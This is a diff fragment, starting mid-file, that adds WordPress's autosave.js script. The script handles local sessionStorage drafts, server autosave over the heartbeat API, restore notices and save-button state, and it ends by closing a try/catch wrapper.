+			// Re-enable 5 sec later. Just gives autosave a head start to avoid collisions.
+			setTimeout( enableButtons, 5000 );
+		}
+
+		/**
+		 * Enables save buttons.
+		 *
+		 * @since 3.9.0
+		 *
+		 * @return {void}
+		 */
+		function enableButtons() {
+			$document.trigger( 'autosave-enable-buttons' );
+		}
+
+		/**
+		 * Gets the content editor.
+		 *
+		 * @since 4.6.0
+		 *
+		 * @return {boolean|*} Returns either false if the editor is undefined,
+		 *                     or the instance of the content editor.
+		 */
+		function getEditor() {
+			return typeof tinymce !== 'undefined' && tinymce.get('content');
+		}
+
+		/**
+		 * Autosave in localStorage.
+		 *
+		 * @since 3.9.0
+		 *
+		 * @return {
+		 * {
+		 * 	hasStorage: *,
+		 * 	getSavedPostData: getSavedPostData,
+		 * 	save: save,
+		 * 	suspend: suspend,
+		 * 	resume: resume
+		 * 	}
+		 * }
+		 * The object with all functions for local storage autosave.
+		 */
+		function autosaveLocal() {
+			var blog_id, post_id, hasStorage, intervalTimer,
+				lastCompareString,
+				isSuspended = false;
+
+			/**
+			 * Checks if the browser supports sessionStorage and it's not disabled.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {boolean} True if the sessionStorage is supported and enabled.
+			 */
+			function checkStorage() {
+				var test = Math.random().toString(),
+					result = false;
+
+				try {
+					window.sessionStorage.setItem( 'wp-test', test );
+					result = window.sessionStorage.getItem( 'wp-test' ) === test;
+					window.sessionStorage.removeItem( 'wp-test' );
+				} catch(e) {}
+
+				hasStorage = result;
+				return result;
+			}
+
+			/**
+			 * Initializes the local storage.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {boolean|Object} False if no sessionStorage in the browser or an Object
+			 *                          containing all postData for this blog.
+			 */
+			function getStorage() {
+				var stored_obj = false;
+				// Separate local storage containers for each blog_id.
+				if ( hasStorage && blog_id ) {
+					stored_obj = sessionStorage.getItem( 'wp-autosave-' + blog_id );
+
+					if ( stored_obj ) {
+						stored_obj = JSON.parse( stored_obj );
+					} else {
+						stored_obj = {};
+					}
+				}
+
+				return stored_obj;
+			}
+
+			/**
+			 * Sets the storage for this blog. Confirms that the data was saved
+			 * successfully.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {boolean} True if the data was saved successfully, false if it wasn't saved.
+			 */
+			function setStorage( stored_obj ) {
+				var key;
+
+				if ( hasStorage && blog_id ) {
+					key = 'wp-autosave-' + blog_id;
+					sessionStorage.setItem( key, JSON.stringify( stored_obj ) );
+					return sessionStorage.getItem( key ) !== null;
+				}
+
+				return false;
+			}
+
+			/**
+			 * Gets the saved post data for the current post.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {boolean|Object} False if no storage or no data or the postData as an Object.
+			 */
+			function getSavedPostData() {
+				var stored = getStorage();
+
+				if ( ! stored || ! post_id ) {
+					return false;
+				}
+
+				return stored[ 'post_' + post_id ] || false;
+			}
+
+			/**
+			 * Sets (save or delete) post data in the storage.
+			 *
+			 * If stored_data evaluates to 'false' the storage key for the current post will be removed.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @param {Object|boolean|null} stored_data The post data to store or null/false/empty to delete the key.
+			 *
+			 * @return {boolean} True if data is stored, false if data was removed.
+			 */
+			function setData( stored_data ) {
+				var stored = getStorage();
+
+				if ( ! stored || ! post_id ) {
+					return false;
+				}
+
+				if ( stored_data ) {
+					stored[ 'post_' + post_id ] = stored_data;
+				} else if ( stored.hasOwnProperty( 'post_' + post_id ) ) {
+					delete stored[ 'post_' + post_id ];
+				} else {
+					return false;
+				}
+
+				return setStorage( stored );
+			}
+
+			/**
+			 * Sets isSuspended to true.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			function suspend() {
+				isSuspended = true;
+			}
+
+			/**
+			 * Sets isSuspended to false.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			function resume() {
+				isSuspended = false;
+			}
+
+			/**
+			 * Saves post data for the current post.
+			 *
+			 * Runs on a 15 seconds interval, saves when there are differences in the post title or content.
+			 * When the optional data is provided, updates the last saved post data.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @param {Object} data The post data for saving, minimum 'post_title' and 'content'.
+			 *
+			 * @return {boolean} Returns true when data has been saved, otherwise it returns false.
+			 */
+			function save( data ) {
+				var postData, compareString,
+					result = false;
+
+				if ( isSuspended || ! hasStorage ) {
+					return false;
+				}
+
+				if ( data ) {
+					postData = getSavedPostData() || {};
+					$.extend( postData, data );
+				} else {
+					postData = getPostData('local');
+				}
+
+				compareString = getCompareString( postData );
+
+				if ( typeof lastCompareString === 'undefined' ) {
+					lastCompareString = initialCompareString;
+				}
+
+				// If the content, title and excerpt did not change since the last save, don't save again.
+				if ( compareString === lastCompareString ) {
+					return false;
+				}
+
+				postData.save_time = ( new Date() ).getTime();
+				postData.status = $( '#post_status' ).val() || '';
+				result = setData( postData );
+
+				if ( result ) {
+					lastCompareString = compareString;
+				}
+
+				return result;
+			}
+
+			/**
+			 * Initializes the auto save function.
+			 *
+			 * Checks whether the editor is active or not to use the editor events
+			 * to autosave, or uses the values from the elements to autosave.
+			 *
+			 * Runs on DOM ready.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			function run() {
+				post_id = $('#post_ID').val() || 0;
+
+				// Check if the local post data is different than the loaded post data.
+				if ( $( '#wp-content-wrap' ).hasClass( 'tmce-active' ) ) {
+
+					/*
+					 * If TinyMCE loads first, check the post 1.5 seconds after it is ready.
+					 * By this time the content has been loaded in the editor and 'saved' to the textarea.
+					 * This prevents false positives.
+					 */
+					$document.on( 'tinymce-editor-init.autosave', function() {
+						window.setTimeout( function() {
+							checkPost();
+						}, 1500 );
+					});
+				} else {
+					checkPost();
+				}
+
+				// Save every 15 seconds.
+				intervalTimer = window.setInterval( save, 15000 );
+
+				$( 'form#post' ).on( 'submit.autosave-local', function() {
+					var editor = getEditor(),
+						post_id = $('#post_ID').val() || 0;
+
+					if ( editor && ! editor.isHidden() ) {
+
+						// Last onSubmit event in the editor, needs to run after the content has been moved to the textarea.
+						editor.on( 'submit', function() {
+							save({
+								post_title: $( '#title' ).val() || '',
+								content: $( '#content' ).val() || '',
+								excerpt: $( '#excerpt' ).val() || ''
+							});
+						});
+					} else {
+						save({
+							post_title: $( '#title' ).val() || '',
+							content: $( '#content' ).val() || '',
+							excerpt: $( '#excerpt' ).val() || ''
+						});
+					}
+
+					var secure = ( 'https:' === window.location.protocol );
+					wpCookies.set( 'wp-saving-post', post_id + '-check', 24 * 60 * 60, false, false, secure );
+				});
+			}
+
+			/**
+			 * Compares 2 strings. Removes whitespaces in the strings before comparing them.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @param {string} str1 The first string.
+			 * @param {string} str2 The second string.
+			 * @return {boolean} True if the strings are the same.
+			 */
+			function compare( str1, str2 ) {
+				function removeSpaces( string ) {
+					return string.toString().replace(/[\x20\t\r\n\f]+/g, '');
+				}
+
+				return ( removeSpaces( str1 || '' ) === removeSpaces( str2 || '' ) );
+			}
+
+			/**
+			 * Checks if the saved data for the current post (if any) is different than the
+			 * loaded post data on the screen.
+			 *
+			 * Shows a standard message letting the user restore the post data if different.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			function checkPost() {
+				var content, post_title, excerpt, $notice,
+					postData = getSavedPostData(),
+					cookie = wpCookies.get( 'wp-saving-post' ),
+					$newerAutosaveNotice = $( '#has-newer-autosave' ).parent( '.notice' ),
+					$headerEnd = $( '.wp-header-end' );
+
+				if ( cookie === post_id + '-saved' ) {
+					wpCookies.remove( 'wp-saving-post' );
+					// The post was saved properly, remove old data and bail.
+					setData( false );
+					return;
+				}
+
+				if ( ! postData ) {
+					return;
+				}
+
+				content = $( '#content' ).val() || '';
+				post_title = $( '#title' ).val() || '';
+				excerpt = $( '#excerpt' ).val() || '';
+
+				if ( compare( content, postData.content ) && compare( post_title, postData.post_title ) &&
+					compare( excerpt, postData.excerpt ) ) {
+
+					return;
+				}
+
+				/*
+				 * If '.wp-header-end' is found, append the notices after it otherwise
+				 * after the first h1 or h2 heading found within the main content.
+				 */
+				if ( ! $headerEnd.length ) {
+					$headerEnd = $( '.wrap h1, .wrap h2' ).first();
+				}
+
+				$notice = $( '#local-storage-notice' )
+					.insertAfter( $headerEnd )
+					.addClass( 'notice-warning' );
+
+				if ( $newerAutosaveNotice.length ) {
+
+					// If there is a "server" autosave notice, hide it.
+					// The data in the session storage is either the same or newer.
+					$newerAutosaveNotice.slideUp( 150, function() {
+						$notice.slideDown( 150 );
+					});
+				} else {
+					$notice.slideDown( 200 );
+				}
+
+				$notice.find( '.restore-backup' ).on( 'click.autosave-local', function() {
+					restorePost( postData );
+					$notice.fadeTo( 250, 0, function() {
+						$notice.slideUp( 150 );
+					});
+				});
+			}
+
+			/**
+			 * Restores the current title, content and excerpt from postData.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @param {Object} postData The object containing all post data.
+			 *
+			 * @return {boolean} True if the post is restored.
+			 */
+			function restorePost( postData ) {
+				var editor;
+
+				if ( postData ) {
+					// Set the last saved data.
+					lastCompareString = getCompareString( postData );
+
+					if ( $( '#title' ).val() !== postData.post_title ) {
+						$( '#title' ).trigger( 'focus' ).val( postData.post_title || '' );
+					}
+
+					$( '#excerpt' ).val( postData.excerpt || '' );
+					editor = getEditor();
+
+					if ( editor && ! editor.isHidden() && typeof switchEditors !== 'undefined' ) {
+						if ( editor.settings.wpautop && postData.content ) {
+							postData.content = switchEditors.wpautop( postData.content );
+						}
+
+						// Make sure there's an undo level in the editor.
+						editor.undoManager.transact( function() {
+							editor.setContent( postData.content || '' );
+							editor.nodeChanged();
+						});
+					} else {
+
+						// Make sure the Code editor is selected.
+						$( '#content-html' ).trigger( 'click' );
+						$( '#content' ).trigger( 'focus' );
+
+						// Using document.execCommand() will let the user undo.
+						document.execCommand( 'selectAll' );
+						document.execCommand( 'insertText', false, postData.content || '' );
+					}
+
+					return true;
+				}
+
+				return false;
+			}
+
+			blog_id = typeof window.autosaveL10n !== 'undefined' && window.autosaveL10n.blog_id;
+
+			/*
+			 * Check if the browser supports sessionStorage and it's not disabled,
+			 * then initialize and run checkPost().
+			 * Don't run if the post type supports neither 'editor' (textarea#content) nor 'excerpt'.
+			 */
+			if ( checkStorage() && blog_id && ( $('#content').length || $('#excerpt').length ) ) {
+				$( run );
+			}
+
+			return {
+				hasStorage: hasStorage,
+				getSavedPostData: getSavedPostData,
+				save: save,
+				suspend: suspend,
+				resume: resume
+			};
+		}
+
+		/**
+		 * Auto saves the post on the server.
+		 *
+		 * @since 3.9.0
+		 *
+		 * @return {Object} {
+		 * 	{
+		 * 		tempBlockSave: tempBlockSave,
+		 * 		triggerSave: triggerSave,
+		 * 		postChanged: postChanged,
+		 * 		suspend: suspend,
+		 * 		resume: resume
+		 * 		}
+		 * 	} The object all functions for autosave.
+		 */
+		function autosaveServer() {
+			var _blockSave, _blockSaveTimer, previousCompareString, lastCompareString,
+				nextRun = 0,
+				isSuspended = false;
+
+
+			/**
+			 * Blocks saving for the next 10 seconds.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			function tempBlockSave() {
+				_blockSave = true;
+				window.clearTimeout( _blockSaveTimer );
+
+				_blockSaveTimer = window.setTimeout( function() {
+					_blockSave = false;
+				}, 10000 );
+			}
+
+			/**
+			 * Sets isSuspended to true.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			function suspend() {
+				isSuspended = true;
+			}
+
+			/**
+			 * Sets isSuspended to false.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			function resume() {
+				isSuspended = false;
+			}
+
+			/**
+			 * Triggers the autosave with the post data.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @param {Object} data The post data.
+			 *
+			 * @return {void}
+			 */
+			function response( data ) {
+				_schedule();
+				_blockSave = false;
+				lastCompareString = previousCompareString;
+				previousCompareString = '';
+
+				$document.trigger( 'after-autosave', [data] );
+				enableButtons();
+
+				if ( data.success ) {
+					// No longer an auto-draft.
+					$( '#auto_draft' ).val('');
+				}
+			}
+
+			/**
+			 * Saves immediately.
+			 *
+			 * Resets the timing and tells heartbeat to connect now.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			function triggerSave() {
+				nextRun = 0;
+				wp.heartbeat.connectNow();
+			}
+
+			/**
+			 * Checks if the post content in the textarea has changed since page load.
+			 *
+			 * This also happens when TinyMCE is active and editor.save() is triggered by
+			 * wp.autosave.getPostData().
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {boolean} True if the post has been changed.
+			 */
+			function postChanged() {
+				var changed = false;
+
+				// If there are TinyMCE instances, loop through them.
+				if ( window.tinymce ) {
+					window.tinymce.each( [ 'content', 'excerpt' ], function( field ) {
+						var editor = window.tinymce.get( field );
+
+						if ( ! editor || editor.isHidden() ) {
+							if ( ( $( '#' + field ).val() || '' ) !== initialCompareData[ field ] ) {
+								changed = true;
+								// Break.
+								return false;
+							}
+						} else if ( editor.isDirty() ) {
+							changed = true;
+							return false;
+						}
+					} );
+
+					if ( ( $( '#title' ).val() || '' ) !== initialCompareData.post_title ) {
+						changed = true;
+					}
+
+					return changed;
+				}
+
+				return getCompareString() !== initialCompareString;
+			}
+
+			/**
+			 * Checks if the post can be saved or not.
+			 *
+			 * If the post hasn't changed or it cannot be updated,
+			 * because the autosave is blocked or suspended, the function returns false.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {Object} Returns the post data.
+			 */
+			function save() {
+				var postData, compareString;
+
+				// window.autosave() used for back-compat.
+				if ( isSuspended || _blockSave || ! window.autosave() ) {
+					return false;
+				}
+
+				if ( ( new Date() ).getTime() < nextRun ) {
+					return false;
+				}
+
+				postData = getPostData();
+				compareString = getCompareString( postData );
+
+				// First check.
+				if ( typeof lastCompareString === 'undefined' ) {
+					lastCompareString = initialCompareString;
+				}
+
+				// No change.
+				if ( compareString === lastCompareString ) {
+					return false;
+				}
+
+				previousCompareString = compareString;
+				tempBlockSave();
+				disableButtons();
+
+				$document.trigger( 'wpcountwords', [ postData.content ] )
+					.trigger( 'before-autosave', [ postData ] );
+
+				postData._wpnonce = $( '#_wpnonce' ).val() || '';
+
+				return postData;
+			}
+
+			/**
+			 * Sets the next run, based on the autosave interval.
+			 *
+			 * @private
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			function _schedule() {
+				nextRun = ( new Date() ).getTime() + ( autosaveL10n.autosaveInterval * 1000 ) || 60000;
+			}
+
+			/**
+			 * Sets the autosaveData on the autosave heartbeat.
+			 *
+			 * @since 3.9.0
+			 *
+			 * @return {void}
+			 */
+			$( function() {
+				_schedule();
+			}).on( 'heartbeat-send.autosave', function( event, data ) {
+				var autosaveData = save();
+
+				if ( autosaveData ) {
+					data.wp_autosave = autosaveData;
+				}
+
+				/**
+				 * Triggers the autosave of the post with the autosave data on the autosave
+				 * heartbeat.
+				 *
+				 * @since 3.9.0
+				 *
+				 * @return {void}
+				 */
+			}).on( 'heartbeat-tick.autosave', function( event, data ) {
+				if ( data.wp_autosave ) {
+					response( data.wp_autosave );
+				}
+				/**
+				 * Disables buttons and throws a notice when the connection is lost.
+				 *
+				 * @since 3.9.0
+				 *
+				 * @return {void}
+				 */
+			}).on( 'heartbeat-connection-lost.autosave', function( event, error, status ) {
+
+				// When connection is lost, keep user from submitting changes.
+				if ( 'timeout' === error || 603 === status ) {
+					var $notice = $('#lost-connection-notice');
+
+					if ( ! wp.autosave.local.hasStorage ) {
+						$notice.find('.hide-if-no-sessionstorage').hide();
+					}
+
+					$notice.show();
+					disableButtons();
+				}
+
+				/**
+				 * Enables buttons when the connection is restored.
+				 *
+				 * @since 3.9.0
+				 *
+				 * @return {void}
+				 */
+			}).on( 'heartbeat-connection-restored.autosave', function() {
+				$('#lost-connection-notice').hide();
+				enableButtons();
+			});
+
+			return {
+				tempBlockSave: tempBlockSave,
+				triggerSave: triggerSave,
+				postChanged: postChanged,
+				suspend: suspend,
+				resume: resume
+			};
+		}
+
+		/**
+		 * Sets the autosave time out.
+		 *
+		 * Wait for TinyMCE to initialize plus 1 second. for any external css to finish loading,
+		 * then save to the textarea before setting initialCompareString.
+		 * This avoids any insignificant differences between the initial textarea content and the content
+		 * extracted from the editor.
+		 *
+		 * @since 3.9.0
+		 *
+		 * @return {void}
+		 */
+		$( function() {
+			// Set the initial compare string in case TinyMCE is not used or not loaded first.
+			setInitialCompare();
+		}).on( 'tinymce-editor-init.autosave', function( event, editor ) {
+			// Reset the initialCompare data after the TinyMCE instances have been initialized.
+			if ( 'content' === editor.id || 'excerpt' === editor.id ) {
+				window.setTimeout( function() {
+					editor.save();
+					setInitialCompare();
+				}, 1000 );
+			}
+		});
+
+		return {
+			getPostData: getPostData,
+			getCompareString: getCompareString,
+			disableButtons: disableButtons,
+			enableButtons: enableButtons,
+			local: autosaveLocal(),
+			server: autosaveServer()
+		};
+	}
+
+	/** @namespace wp */
+	window.wp = window.wp || {};
+	window.wp.autosave = autosave();
+
+}( jQuery, window ));
+
 
 }catch(e){}
 })();
